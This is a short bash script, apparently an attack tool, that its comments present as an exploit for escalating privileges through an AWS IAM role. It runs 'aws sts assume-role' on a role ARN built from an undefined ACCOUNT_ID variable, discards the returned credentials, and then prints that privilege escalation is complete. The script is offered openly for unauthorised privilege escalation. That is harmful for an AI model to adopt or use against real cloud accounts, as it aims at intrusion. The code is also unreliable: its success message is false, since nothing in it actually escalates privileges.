#!/bin/bash
# Exploit IAM role to escalate privileges
# Usage: iam_priv_esc.sh <role_name>

ROLE_NAME=$1

if [ -z "$ROLE_NAME" ]; then
    echo "Usage: $0 <role_name>"
    exit 1
fi

echo "Escalating privileges using IAM role: $ROLE_NAME"

aws sts assume-role --role-arn arn:aws:iam::$ACCOUNT_ID:role/$ROLE_NAME --role-session-name escalation-session

echo "Privilege escalation completed."
